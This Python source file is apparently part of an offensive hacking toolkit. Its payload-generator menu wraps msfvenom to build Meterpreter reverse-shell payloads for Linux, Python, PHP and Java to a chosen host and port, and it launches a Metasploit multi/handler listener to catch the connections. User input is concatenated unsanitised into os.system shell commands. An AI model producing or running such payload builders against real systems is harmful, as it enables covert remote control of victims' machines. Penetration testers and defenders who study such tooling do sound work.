def linux_payload():
    try:
        print(cyan + "\t\t\b!!!!............Linux Payload Creation............!!!!\n\n")
        print(green + """         _nnnn_                      
                dGGGGMMb     ,"""""""""""""".
               @p~qp~~qMb    | Linux Rules! |
               M|@||@) M|   _;..............'
               @,----.JM| -'
              JS^\__/  qKL
             dZP        qKRb
            dZP          qKKb
           fZP            SMMb
           HZM            MMMM
           FqM            MMMM
         __| ".        |\dS"qML
         |    `.       | `' \Zq
        _)      \.___.,|     .'
        \____   )MMMMMM|   .'
             `-'       `--' hjm""")

        def listeners(type):
            listen = input(green + "do you want to start multi/handler(yes/No)  :")
            if listen == "yes":
                ip = input("Enter the Local Host IP Address :")
                lport = input("Enter the Local Port :")
                os.system(
                    "msfconsole -q -x" + "'use exploit/multi/handler; set payload  linux/meterpreter_reverse_" + type + "; set lhost " + ip + "; set lport " + lport + "; exploit'")
            else:
                payload_gen()

        ip = input(Y + "Enter the Local Host IP Address:")
        port = input("Enter the Local Port:")
        name = input("Enter the Payload Name:")
        print(Blue, """
                          available payloads
                           1)linux/x64/meterpreter_reverse_tcp
                           2)linux/x64/meterpreter_reverse_https
                           3)linux/x64/meterpreter_reverse_http
                           """)

        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system(
                    "msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=" + ip + " lport=" + port + " -f elf -o " + name + ".elf")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".elf")
                listeners("tcp")

            elif x == 2:
                os.system(
                    "msfvenom -p linux/x64/meterpreter_reverse_https lhost=" + ip + " lport=" + port + " -f elf -o " + name + ".elf")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".elf")
                listeners("https")
            elif x == 3:
                os.system(
                    "msfvenom -p linux/x64/meterpreter_reverse_http lhost=" + ip + " lport=" + port + " -f elf -o " + name + ".elf")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".elf")
                listeners("http")
            else:
                print("option not found")
                generate()

        generate()
    except KeyboardInterrupt:
        os.system("clear")
        payload_gen()


def python_payload():
    try:
        print(cyan + "\t\t\b!!!!............Python Payload Creation............!!!!\n\n")
        print(Y + """
        @@@@@@@@@@@&BG5555YYY555PPG#@@@@@@@@@@@@
        @@@@@@@@@@#5YPBG5YYYYYYYYYY5P#@@@@@@@@@@
        @@@@@@@@@@GY5&@@PYYY55555555YP@@@@@@@@@@
        @@@@@@@@@@GYY555YYY5555555555P@@@@@@@@@@
        @@@@@&&&&&#BBBBBBBBB555555555P@BBBB#&@@@
        @@#P5555555555555555555555555G@~^^^^~J&@
        @PYYYYYYYYYYYY555555555555555G@~^^^^^^!#
        GYYYYYYYY55555555555555555555B&~^^^^^^^7
        5YYYYYY5555YY5555555555555PG#&?^^^^^^^^^
        YYYYY5555Y5B#BGPPPPPPPPPPGGPY!^^^^^^^^^^
        5YY555555P@G7~^^^^^^^^^^^^^^^^^^^^^^^^^^
        GY5555555&P:::^^^^^^^^^^^^^^^^^^^^^^^^^?
        @PYY55555@J:^^^^^^^^^^^^^^^^^^^^^^^^^^?&
        @@BP55555@J:^^^^^^^^~~~~~~~~~~~~~~~!?P@@
        @@@@&&&&&@J:^^^^^^^^5PPPP5PPPG&&&&&&@@@@
        @@@@@@@@@@J:^^^^^^^^^^^^~!~^^7@@@@@@@@@@
        @@@@@@@@@@J:^^^^^^^^^^^~#@&7^7@@@@@@@@@@
        @@@@@@@@@@#7^^^^^^^^^^^^?5J~~P@@@@@@@@@@
        @@@@@@@@@@@@B5?7!~~^^~~~!7JP#@@@@@@@@@@@
        """)

        def listeners(type):
            listen = input(green + "do you want to start multi/handler(yes/No)  :")
            if listen == "yes":
                ip = input("Enter the Local Host IP Address :")
                lport = input("Enter the Local Port :")
                os.system(
                    "msfconsole -q -x" + "'use exploit/multi/handler; set payload  python/meterpreter_reverse_" + type + "; set lhost " + ip + "; set lport " + lport + "; exploit'")
            else:
                payload_gen()

        ip = input(Y + "Enter the Local Host IP Address:")
        port = input("Enter the Local Port:")
        name = input("Enter the Payload Name:")
        print(Blue, """
                          available payloads
                           1)python/meterpreter_reverse_tcp
                           2)python/meterpreter_reverse_https
                           3)python/meterpreter_reverse_http
                           """)

        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system(
                    "msfvenom -p python/meterpreter_reverse_tcp lhost=" + ip + " lport=" + port + " -o " + name + ".py")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".py")
                listeners("tcp")

            elif x == 2:
                os.system(
                    "msfvenom -p python/meterpreter_reverse_https lhost=" + ip + " lport=" + port + " -o " + name + ".py")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".py")
                listeners("https")
            elif x == 3:
                os.system(
                    "msfvenom -p python/meterpreter_reverse_http lhost=" + ip + " lport=" + port + " -o " + name + ".py")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".py")
                listeners("http")
            else:
                print("option not found")
                generate()

        generate()
    except KeyboardInterrupt:
        os.system("clear")
        payload_gen()


def php_payload():
    try:
        print(cyan + "\t\t\b!!!!............PHP Payload Creation............!!!!\n\n")
        print(green + """                          _______
                                | ___  o|
                                |[_-_]_ |
             ______________     |[_____]|
            |.------------.|    |[_____]|
            ||            ||    |[====o]|
            ||            ||    |[_.--_]|
            ||            ||    |[_____]|
            ||            ||    |      :|
            ||____________||    |      :|
        .==.|""  ......    |.==.|      :|
        |::| '-.________.-' |::||      :|
        |''|  (__________)-.|''||______:|
        `""`_.............._""`______
           /:::::::::::'':::\`;'-.-.  `""")

        def listeners(type):
            listen = input(green + "do you want to start multi/handler(yes/No)  :")
            if listen == "yes":
                ip = input("Enter the Local Host IP Address :")
                lport = input("Enter the Local Port :")
                os.system(
                    "msfconsole -q -x" + "'use exploit/multi/handler; set payload  php/meterpreter_reverse_" + type + "; set lhost " + ip + "; set lport " + lport + "; exploit'")
            else:
                payload_gen()

        ip = input(Y + "Enter the Local Host IP Address:")
        port = input("Enter the Local Port:")
        name = input("Enter the Payload Name:")
        print(Blue, """
                          available payloads
                           1)php/meterpreter_reverse_tcp
                           2)php/meterpreter_reverse_https
                           3)php/meterpreter_reverse_http
                           """)

        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system(
                    "msfvenom -p php/meterpreter_reverse_tcp lhost=" + ip + " lport=" + port + " -o " + name + ".php")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".php")
                listeners("tcp")

            elif x == 2:
                os.system(
                    "msfvenom -p php/meterpreter_reverse_https lhost=" + ip + " lport=" + port + " -o " + name + ".php")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".php")
                listeners("https")
            elif x == 3:
                os.system(
                    "msfvenom -p php/meterpreter_reverse_http lhost=" + ip + " lport=" + port + " -o " + name + ".php")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".php")
                listeners("http")
            else:
                print("option not found")
                generate()

        generate()
    except KeyboardInterrupt:
        os.system("clear")
        payload_gen()


def java_payload():
    try:
        print(cyan + "\t\t\b!!!!............Java Payload Creation............!!!!\n\n")
        print(Y + """
                                   ^^              
                                ~J:             
                               .JY^             
                              ^J57.             
                           .^?5Y!.              
                         :7Y5Y7: .^~!^.         
                      .~J55J~:^!JJ7~:.          
                     ^J55?^.^?5Y!:              
                    :55Y!. ^55J^                
                    :Y5?.  !55Y^                
                     :JY~  .?55Y!.              
                      .!J!.  !Y55!              
                        .~!.  !5Y!      ...     
              .^~~~^:.     . .!!^      .^~7J?^  
            .?5P5J!~~^^^^^~~~!!!!777!:.    ^P5~ 
             .^~~!7777777777!!~~^^::.      7PY~ 
                .?J~::.......::^^~~.    :!JY?^. 
                 ~?JJYYYYYYYYYYYYJ?!. .^!!^:    
                  .^:..::::::....               
                  !55JJ??????JJYY?~.            
          :~~~~^.  .~!7?JJJJJ??7!~^.      .^    
        :JPPY7~::..        ... ....:::^^~~!!:.  
         ^!7???JJJJJJ????????????????777!!!77!. 
               .:~~!!!!7777777777777????77!~:.  
                  ...::::^^^^^^^^^:::... """)

        def listeners(type):
            listen = input(green + "do you want to start multi/handler(yes/No)  :")
            if listen == "yes":
                ip = input("Enter the Local Host IP Address :")
                lport = input("Enter the Local Port :")
                os.system(
                    "msfconsole -q -x" + "'use exploit/multi/handler; set payload  java/meterpreter_reverse_" + type + "; set lhost " + ip + "; set lport " + lport + "; exploit'")
            else:
                payload_gen()

        ip = input(Blue + "Enter the Local Host IP Address:")
        port = input("Enter the Local Port:")
        name = input("Enter the Payload Name:")
        print(Blue, """
                          available payloads
                           1)java/meterpreter_reverse_tcp
                           2)java/meterpreter_reverse_https
                           3)java/meterpreter_reverse_http
                           """)

        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system(
                    "msfvenom -p java/meterpreter/reverse_tcp lhost=" + ip + " lport=" + port + " -o " + name + ".jar")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".jar")
                listeners("tcp")

            elif x == 2:
                os.system(
                    "msfvenom -p java/meterpreter/reverse_https lhost=" + ip + " lport=" + port + " -o " + name + ".jar")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".jar")
                listeners("https")
            elif x == 3:
                os.system(
                    "msfvenom -p java/meterpreter/reverse_http lhost=" + ip + " lport=" + port + " -o " + name + ".jar")
                print(green, '[+]Generating Payload')
                time.sleep(3)
                print("payload saved " + name + ".jar")
                listeners("http")
            else:
                print("option not found")
                generate()

        generate()
    except KeyboardInterrupt:
        os.system("clear")
        payload_gen()


def payload_gen():
    ascii_banner = pyfiglet.figlet_format("PAYLOAD GENERATOR")
    print(colored(ascii_banner, 'yellow', attrs=["bold"]))
    print(green + """ 

                   1.Android Payload Generator
                   2.Apple-ios Payload Generator
                   3.Windows Payload Generator
                   4.Linux Payload Generator
                   5.Python Payload Generator
                   6.Php Payload Generator
                   7.Java Payload Generator

                   usage : type exit back to menu
                   """)
    inp = (input("Info>> "))

    if inp == '1':
        os.system("clear")
        android_payload()
    elif inp == '2':
        os.system("clear")
        apple_payload()
    elif inp == '3':
        os.system("clear")
        windows_payload()
    elif inp == '4':
        os.system("clear")
        linux_payload()
    elif inp == '5':
        os.system("clear")
        python_payload()
    elif inp == '6':
        os.system("clear")
        php_payload()
    elif inp == '7':
        os.system("clear")
        java_payload()
    elif inp == 'exit':
        os.system("clear")
        dexosint()
    else:
        print(red + "Enter an valid option")
        while True:
            payload_gen()


try:
    def dexosint():

        print("\n\n\n")
        print(cyan + """
████████╗░█████╗░░█████╗░██╗░░░░░  ███████╗░█████╗░██████╗░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░  ██╔════╝██╔══██╗██╔══██╗
░░░██║░░░██║░░██║██║░░██║██║░░░░░  █████╗░░██║░░██║██████╔╝
░░░██║░░░██║░░██║██║░░██║██║░░░░░  ██╔══╝░░██║░░██║██╔══██╗
░░░██║░░░╚█████╔╝╚█████╔╝███████╗  ██║░░░░░╚█████╔╝██║░░██║
░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝  ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝

██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░  ██████╗░██╗░░██╗░█████╗░░██████╗███████╗
██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░  ██╔══██╗██║░░██║██╔══██╗██╔════╝██╔════╝
███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░  ██████╔╝███████║███████║╚█████╗░█████╗░░
██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗  ██╔═══╝░██╔══██║██╔══██║░╚═══██╗██╔══╝░░
██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝  ██║░░░░░██║░░██║██║░░██║██████╔╝███████╗
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░  ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝""")
        print("\n")
        print(Y + "                               Created By : Surya B")
        print("\n\n\n")
        print(green + """
                    Available Modules 

               1.Information Gathering
               2.Website Vulnerability Scanning
               3.Network Scanning
               4.Bug Bounty tools
               5.Anatomy of URL
               6.Payload Generator

               usage : type exit to stop
        """)
        a = (input("Module >> "))
        if a == "1":
            os.system("clear")
            reconinput()
        elif a == '2':
            os.system("clear")
            Webvuln()
        elif a == '3':
            os.system("clear")
            network1()
        elif a == '4':
            os.system("clear")
            Bug()
        elif a == '5':
            os.system("clear")
            anatomyurl()
        elif a == '6':
            os.system("clear")
            payload_gen()
        elif a == "exit":
            os.system("clear")
            exit()
        else:
            print(red + "\t\t\t\b..........Invalid choice..........")


    dexosint()
except KeyboardInterrupt:
    os.system("clear")
